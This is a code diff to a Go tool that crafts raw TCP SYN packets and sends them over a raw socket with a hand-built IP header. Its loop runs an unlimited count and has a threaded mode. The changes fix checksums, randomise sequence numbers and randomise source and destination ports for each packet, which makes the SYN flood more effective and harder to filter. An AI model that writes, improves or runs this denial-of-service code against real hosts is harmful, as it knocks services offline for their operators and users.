@@ -40,10 +40,18 @@ func createSYNPacket(srcIP string, dstIP string, srcPort int, dstPort int) ([]by
 		SrcPort: layers.TCPPort(srcPort),
 		DstPort: layers.TCPPort(dstPort),
 		SYN:     true,
+		DataOffset: 5,
+		Window:    14600,
+		Seq: 	uint32(rand.Intn(1 << 32)),
 	}
 
+	tcpHeader.SetNetworkLayerForChecksum(&ipHeader)
+
 	buffer := gopacket.NewSerializeBuffer()
-	err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, &ipHeader, &tcpHeader)
+	err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{
+		ComputeChecksums: true,
+		FixLengths: 	true,
+	}, &ipHeader, &tcpHeader)
 	if err != nil {
 		logger.Error().Err(err).Msg("Failed to serialize packet")
 		return nil, err
@@ -59,6 +67,12 @@ func sendPacket(dstIP *string, dstPort *int, iface *string, packet []byte) {
 			return
 		}
 		defer syscall.Close(fd)
+
+		err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+		if err != nil {
+			logger.Error().Err(err).Msg("Failed to set socket options")
+			return
+		}
 
 		
 		err = syscall.BindToDevice(fd, *iface)
@@ -135,8 +149,8 @@ func main() {
 
 	srcPort := parser.Int("s", "src-port", &argparse.Options{
 		Required: false,
-		Help:     "Source port, must be between 1025 and 65535, default is random",
-		Default:  rand.Intn(65535-1025) + 1025,
+		Help:     "Source port, must be between 1025 and 65535, default is -1 (random for each packet)",
+		Default:  -1,
 		Validate: func(args []string) error {
 			val, err := strconv.Atoi(args[0])
 			if err != nil {
@@ -151,8 +165,8 @@ func main() {
 
 	dstPort := parser.Int("d", "dst-port", &argparse.Options{
 		Required: false,
-		Help:     "Destination port, must be between 1025 and 65535, default is random",
-		Default:  rand.Intn(65535-1025) + 1025,
+		Help:     "Destination port, must be between 1025 and 65535, default is  -1 (random for each packet)",
+		Default:  -1,
 		Validate: func(args []string) error {
 			val, err := strconv.Atoi(args[0])
 			if err != nil {
@@ -222,10 +236,27 @@ func main() {
 		logger.Debug().Msg("Debug mode enabled")
 	}
 
+	srcRandom := false
+	dstRandom := false
+	if *srcPort == -1 {
+		srcRandom = true
+	}
+	if *dstPort == -1 {
+		dstRandom = true
+	}
+
+
 	if *threaded {
 		pktCh := make(chan []byte)
 	
 		for i := 0; i < *number || *number == -1; i++ {
+			if srcRandom {
+				*srcPort = rand.Intn(65535-1025) + 1025
+			}
+			if dstRandom {
+				*dstPort = rand.Intn(65535-1025) + 1025
+			}
+
 			go func() {
 				packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
 				if err != nil {
@@ -242,6 +273,14 @@ func main() {
 		}
 	} else {
 		for i := 0; i < *number || *number == -1; i++ {
+			if srcRandom {
+				*srcPort = rand.Intn(65535-1025) + 1025
+			}
+
+			if dstRandom {
+				*dstPort = rand.Intn(65535-1025) + 1025
+			}
+			
 			packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
 			if err != nil {
 				logger.Error().Err(err).Msg("Failed to create packet")
